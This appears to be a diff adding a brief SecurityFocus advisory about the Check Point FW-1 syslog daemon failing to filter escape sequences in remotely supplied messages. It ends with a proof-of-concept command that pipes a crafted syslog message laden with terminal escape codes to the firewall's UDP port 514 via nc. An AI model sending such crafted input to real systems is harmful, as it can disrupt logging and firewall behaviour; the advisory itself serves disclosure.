@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/7161/info
+
+An issue has been discovered in Check Point FW-1 syslog daemon when attempting to process a malicious, remotely supplied, syslog message. Specifically, some messages containing escape sequences are not properly filtered out. This may result in unpredictable behaviour by the Check Point syslog daemon.
+
+The technical details regarding this issue are currently unknown. This BID will be updated when further information becomes available.
+
+[attacker]# echo -e "<189>19: 00:01:04:
+Test\a\033[2J\033[2;5m\033[1;31mHACKER~
+ATTACK\033[2;25m\033[22;30m\033[3q" | nc -u firewall 514
